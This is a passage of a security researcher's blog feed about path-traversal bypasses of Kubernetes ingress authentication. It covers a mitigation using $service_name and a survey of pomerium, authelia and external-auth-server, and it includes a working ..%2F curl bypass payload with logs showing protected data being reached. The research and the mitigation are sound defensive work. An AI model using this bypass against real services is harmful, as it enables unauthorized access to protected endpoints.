+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">backend&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">service&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">protected-service&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">port&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">number&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="m">8080&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="mitigation">Mitigation&lt;/h3>
+&lt;p>One thing is to not trust content of &lt;code>X-Original-Uri&lt;/code> and &lt;code>X-Auth-Request-Redirect&lt;/code> headers. But there is also nice variable that can be used: &lt;code>$service_name&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="line">&lt;span class="cl">&lt;span class="nt">apiVersion&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">networking.k8s.io/v1&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="nt">kind&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Ingress&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="nt">metadata&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">my-ingress&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">annotations&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">nginx.ingress.kubernetes.io/rewrite-target&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">/$1&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">nginx.ingress.kubernetes.io/auth-url&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">http://auth-service.default.svc.cluster.local:8080/verify&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">nginx.ingress.kubernetes.io/configuration-snippet&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="sd">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="sd"> more_set_input_headers &amp;#34;X-Forwarded-Scheme: $scheme&amp;#34;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="sd"> more_set_input_headers &amp;#34;X-Forwarded-Uri: $uri&amp;#34;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="sd"> more_set_input_headers &amp;#34;X-Forwarded-Prefix: $service_name&amp;#34;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="sd"> more_set_input_headers &amp;#34;X-Forwarded-Host: $http_host&amp;#34;;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>it allows to get name of service in kubernetes that is targeted by request and pass it to &lt;code>auth-url&lt;/code>. This way it&amp;rsquo;s not manipulated!&lt;/p>
+&lt;h2 id="summary">Summary&lt;/h2>
+&lt;p>I&amp;rsquo;m really happy that I have asked myself what is &lt;code>X-Auth-Request-Redirect&lt;/code> header 🙂 This question took me for nice adventure, where I have checked source code of several ingress controllers.&lt;/p>
+&lt;p>What is sad is how nginx is considering &lt;code>$request_uri&lt;/code> and how hard is to convince both nginx and ingress-nginx team that this is real security problem.&lt;/p>
+&lt;p>Whole code of this example is here &lt;a class="link" href="https://github.com/xvnpw/k8s-ingress-auth-bypass" target="_blank" rel="noopener"
+>https://github.com/xvnpw/k8s-ingress-auth-bypass&lt;/a>.&lt;/p>
+&lt;h3 id="other-articles-from-this-series">Other articles from this series&lt;/h3>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://xvnpw.github.io/posts/cve_2021_43557_apache_apisix_path_traversal_in_request_uri_variable/" >CVE-2021-43557: Apache APISIX: Path traversal in request_uri variable&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://xvnpw.github.io/posts/path_traversal_in_authorization_context_in_traefik_and_haproxy/" >Path traversal in authorization context in Traefik and HAProxy&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://xvnpw.github.io/posts/path_traversal_in_authorization_context_in_emissary/" >Path traversal in authorization context in Emissary&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://xvnpw.github.io/posts/path_traversal_in_authorization_context_in_kong_and_f5_nginx/" >Path traversal in authorization context in Kong and F5 NGINX&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://xvnpw.github.io/posts/bug_bounty_tips_for_nginx_request_uri_path_traversal_bypass/" >Bug bounty tips for nginx $request_uri path traversal bypass&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://xvnpw.github.io/posts/hunting_for_buggy_authentication_authorization_services_on_github/" >Hunting for buggy authentication/authorization services on github&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;p>Thanks for reading! You can follow me on &lt;a class="link" href="https://twitter.com/xvnpw" target="_blank" rel="noopener"
+>Twitter&lt;/a>.&lt;/p></description></item><item><title>Hunting for buggy authentication/authorization services on github</title><link>https://xvnpw.github.io/posts/hunting_for_buggy_authentication_authorization_services_on_github/</link><pubDate>Sun, 28 Nov 2021 10:58:59 +0100</pubDate><guid>https://xvnpw.github.io/posts/hunting_for_buggy_authentication_authorization_services_on_github/</guid><description>&lt;figure class="image-center">&lt;img src="https://user-images.githubusercontent.com/17719543/139592951-0fafc921-437e-4bb7-b0ee-199dd72b36c3.png"/>
+&lt;/figure>
+&lt;p>To successful bypass access control using path traversal in &lt;code>$request_uri&lt;/code>, you need to have buggy authentication/authorization service. Buggy in a way it&amp;rsquo;s not normalizing url/uri that is part of access control decision. Let me find more of those on github that are relying on &lt;code>X-Original-Url&lt;/code>. There is high chance that this header is populated from &lt;code>$request_uri&lt;/code> variable and not protected in any way.&lt;/p>
+&lt;h2 id="pomerium">pomerium&lt;/h2>
+&lt;blockquote>
+&lt;p>Pomerium is an identity-aware proxy that enables secure access to internal applications.&lt;/p>
+&lt;/blockquote>
+&lt;p>In research I was using pomerium in version &lt;strong>0.15.5&lt;/strong>.&lt;/p>
+&lt;p>Let&amp;rsquo;s look into code. Here is how &lt;code>X-Original-Url&lt;/code> header is used:&lt;/p>
+&lt;figure>&lt;img src="https://user-images.githubusercontent.com/17719543/139598398-f7236d2f-a6a6-4cc3-8d4e-b384a4f702d7.png"/>
+&lt;/figure>
+&lt;p>Later this &lt;code>originalURL&lt;/code> is taking part in decision based on polices. Policy definition can include path, which is key information here:&lt;/p>
+&lt;figure>&lt;img src="https://user-images.githubusercontent.com/17719543/139598428-2a91dfde-897e-47a1-a5ea-b6b73b7f0f4f.png"/>
+&lt;/figure>
+&lt;p>As you can see there are two possibilities interesting for exploitation: &lt;code>Prefix&lt;/code> and &lt;code>Regex&lt;/code>.&lt;/p>
+&lt;p>In official docs you can find how to specify such policy:&lt;/p>
+&lt;figure>&lt;img src="https://user-images.githubusercontent.com/17719543/139598445-2bf29761-e9a4-4738-a5e4-927e716baf60.png"/>
+&lt;/figure>
+&lt;p>For now I&amp;rsquo;m not going to exploit it further as it quite complicated to setup environment for it. I cannot be 100% sure for successful exploitation, but I have strong indicators in code that it will occur.&lt;/p>
+&lt;h2 id="authelia">authelia&lt;/h2>
+&lt;blockquote>
+&lt;p>Authelia is an open-source authentication and authorization server providing two-factor authentication and single sign-on (SSO) for your applications via a web portal. It acts as a companion for reverse proxies like nginx, Traefik or HAProxy to let them know whether requests should either be allowed or redirected to Authelia&amp;rsquo;s portal for authentication.&lt;/p>
+&lt;/blockquote>
+&lt;p>In research I was using authelia in version &lt;strong>4.32.2&lt;/strong>.&lt;/p>
+&lt;p>The official description of the authelia perfectly matching my exploitation scenario. I just need to have policy based on path and no defense on &lt;code>X-Original-Url&lt;/code> header.&lt;/p>
+&lt;p>Let&amp;rsquo;s check code first:&lt;/p>
+&lt;figure>&lt;img src="https://user-images.githubusercontent.com/17719543/139598518-85f428db-bafc-4bcb-ae49-9b108f2cabd6.png"/>
+&lt;/figure>
+&lt;p>&lt;code>X-Original-Url&lt;/code> header is take from request without much of validation and placed later as &lt;code>targetURL&lt;/code>:&lt;/p>
+&lt;figure>&lt;img src="https://user-images.githubusercontent.com/17719543/139598541-334a5da0-1dc5-4aea-8eb2-f5459cf23db5.png"/>
+&lt;/figure>
+&lt;p>After that &lt;code>targetURL&lt;/code> is part of logic to make decision whether request is passed as is or required to be authenticated:&lt;/p>
+&lt;figure>&lt;img src="https://user-images.githubusercontent.com/17719543/139598551-7038031f-6d80-450b-adb8-94439b31b35d.png"/>
+&lt;/figure>
+&lt;p>In official documentation there is example of rule using in resource regex:&lt;/p>
+&lt;figure>&lt;img src="https://user-images.githubusercontent.com/17719543/139598563-4f497082-bd4d-4079-bb18-643631c40178.png"/>
+&lt;/figure>
+&lt;p>For me, this case is very similar to pomerium. I will also not go deeper for now in exploitation. It&amp;rsquo;s visible for me, that authelia has strong indicator for successful exploitation, but one more time I cannot be 100% sure.&lt;/p>
+&lt;h2 id="travisghansenexternal-auth-server">travisghansen/external-auth-server&lt;/h2>
+&lt;p>&lt;a class="link" href="https://github.com/travisghansen/external-auth-server" target="_blank" rel="noopener"
+>travisghansen/external-auth-server&lt;/a> has primary function to help Kubernetes users to deal with different authentication schemas. In &lt;a class="link" href="https://github.com/travisghansen/external-auth-server/blob/master/PLUGINS.md#request_js" target="_blank" rel="noopener"
+>documentation&lt;/a> I could find ideal case for bypass. It&amp;rsquo;s using &lt;code>request_js&lt;/code> plugin to make decision based on &lt;code>X-Original-Url&lt;/code> header:&lt;/p>
+&lt;figure>&lt;img src="https://user-images.githubusercontent.com/17719543/139594490-48b32b0d-0631-49a7-b2c6-0de034871102.png"/>
+&lt;/figure>
+&lt;p>To be sure, whether any normalization is in place, I have checked code that is making this &lt;code>parentReqInfo&lt;/code> object:&lt;/p>
+&lt;p>It&amp;rsquo;s in &lt;a class="link" href="https://github.com/travisghansen/external-auth-server/blob/10ad9710390f38803de92f67e611a568e8d2c79f/src/utils.js#L119" target="_blank" rel="noopener"
+>utils.js&lt;/a> in function &lt;code>get_parent_request_info&lt;/code>:&lt;/p>
+&lt;figure>&lt;img src="https://user-images.githubusercontent.com/17719543/139594519-9c3caaa2-e1d9-4e8a-b9cf-c2f59885ba4e.png"/>
+&lt;/figure>
+&lt;p>I had some problems to run travisghansen/external-auth-server in Kubernetes. Mostly because it&amp;rsquo;s quite complicated. So to really verify if it&amp;rsquo;s vulnerable, I have copied part of utils.js and tested only it:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="line">&lt;span class="cl">&lt;span class="s1">&amp;#39;use strict&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">express&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;express&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">utils&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;./utils&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// Constants
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="kr">const&lt;/span> &lt;span class="nx">PORT&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">8080&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">HOST&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// App
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="kr">const&lt;/span> &lt;span class="nx">app&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">express&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">app&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/verify&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">res&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">headers&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">const&lt;/span> &lt;span class="nx">parentReqInfo&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">utils&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">get_parent_request_info&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">parentReqInfo&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">parentReqInfo&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">parsedUri&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">path&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">startsWith&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/public-service/&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">statusCode&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">200&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">send&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">const&lt;/span> &lt;span class="nx">apiKey&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">headers&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;X-Api-Key&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">apiKey&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;secret-api-key&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">statusCode&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">200&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">send&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">statusCode&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">401&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">send&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">app&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">listen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">PORT&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">HOST&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sb">`Running on http://&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nx">HOST&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="sb">:&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nx">PORT&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="sb">`&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>First send request using curl:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">curl -v http://app.test/public-service/..%2Fprotected-service/protected
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Next check logs of &lt;code>auth-service&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl logs auth-service-node-859ccc54cc-8cnlp -f
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;x-request-id&amp;#39;&lt;/span>: &lt;span class="s1">&amp;#39;afd1f7fbc4c45c2db17cc1f72c5ec834&amp;#39;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> host: &lt;span class="s1">&amp;#39;auth-service-node.default.svc.cluster.local&amp;#39;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;x-original-url&amp;#39;&lt;/span>: &lt;span class="s1">&amp;#39;http://app.test/public-service/..%2Fprotected-service/protected&amp;#39;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;x-original-method&amp;#39;&lt;/span>: &lt;span class="s1">&amp;#39;GET&amp;#39;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;x-real-ip&amp;#39;&lt;/span>: &lt;span class="s1">&amp;#39;172.17.0.1&amp;#39;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;x-forwarded-for&amp;#39;&lt;/span>: &lt;span class="s1">&amp;#39;172.17.0.1&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> uri: &lt;span class="s1">&amp;#39;http://app.test/public-service/..%2Fprotected-service/protected&amp;#39;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> parseduri: &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> scheme: &lt;span class="s1">&amp;#39;http&amp;#39;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> userinfo: undefined,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> host: &lt;span class="s1">&amp;#39;app.test&amp;#39;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> port: undefined,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> path: &lt;span class="s2">&amp;#34;/public-service/..%2Fprotected-service/protected&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> query: undefined,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> fragment: undefined,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> reference: &lt;span class="s1">&amp;#39;absolute&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> parsedQuery: &lt;span class="o">{}&lt;/span>,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> method: &lt;span class="s1">&amp;#39;GET&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>First &lt;code>{…}&lt;/code> is from &lt;code>console.log(req.headers)&lt;/code> and second &lt;code>{…} &lt;/code>is from &lt;code>console.log(parentReqInfo)&lt;/code>. Path is not normalized and wrong decision is made.&lt;/p>
+&lt;figure>&lt;img src="https://user-images.githubusercontent.com/17719543/139594597-49abb40e-7afb-40fb-b4b4-211f871479f0.png"/>
+&lt;/figure>
+&lt;p>I got protected data. One more time 😅&lt;/p>
+&lt;h2 id="summary">Summary&lt;/h2>
+&lt;p>I have found three repositories that are using &lt;code>X-Original-Url&lt;/code> header and are not protecting against manipulation.&lt;/p>
